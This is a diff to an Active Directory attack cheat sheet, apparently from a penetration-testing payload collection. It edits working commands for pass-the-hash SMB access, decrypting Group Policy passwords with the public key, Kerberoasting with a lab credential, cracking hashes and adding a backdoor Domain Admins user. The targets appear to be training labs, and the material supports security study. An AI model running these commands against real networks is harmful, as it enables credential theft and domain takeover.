@@ -84,8 +84,8 @@ mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
 
 ```powershell
 pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
-ls # list files
-cd 
+ls  # list files
+cd  # move inside a folder
 get # download files
 put # replace a file
 ```
@@ -94,6 +94,18 @@ or
 
 ```powershell
 smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share
+        Users           Disk
+use Sharename # select a Sharename
+cd Folder     # move inside a folder
+ls            # list files
 ```
 
 Mount a share
@@ -117,7 +129,10 @@ Decrypt a Group Policy Password found in SYSVOL (by [0x00C651E0](https://twitter
 ```bash
 echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
 
-e.g: echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
+e.g: 
+echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
+
+echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
 ```
 
 Metasploit modules to enumerate shares and credentials
@@ -319,7 +334,7 @@ TODO
 ### Kerberoast
 
 ```powershell
-GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request-user Administrator >
+$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request-user Administrator >
 
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -336,11 +351,6 @@ Then crack the hash with hashcat or john
 hashcat -m 13100 -a 0 hash.txt crackstation.txt
 ./john ~/hash.txt --wordlist=rockyou.lst
 ```
-
-
-- https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf
-- https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
-- https://room362.com/post/2016/kerberoast-pt1/
 
 ### Pass-the-Hash
 
@@ -463,7 +473,7 @@ net user hacker2 hacker123 /add /Domain
 net group "Domain Admins" hacker2 /add /domain
 ```
 
-## Documentation / Thanks to
+## References
 
 * [https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html](https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html)
 * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
@@ -491,3 +501,6 @@ net group "Domain Admins" hacker2 /add /domain
 * [BlueHat IL - Benjamin Delpy](https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf)
 * [Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
 * [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
+* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
+* [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+* [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
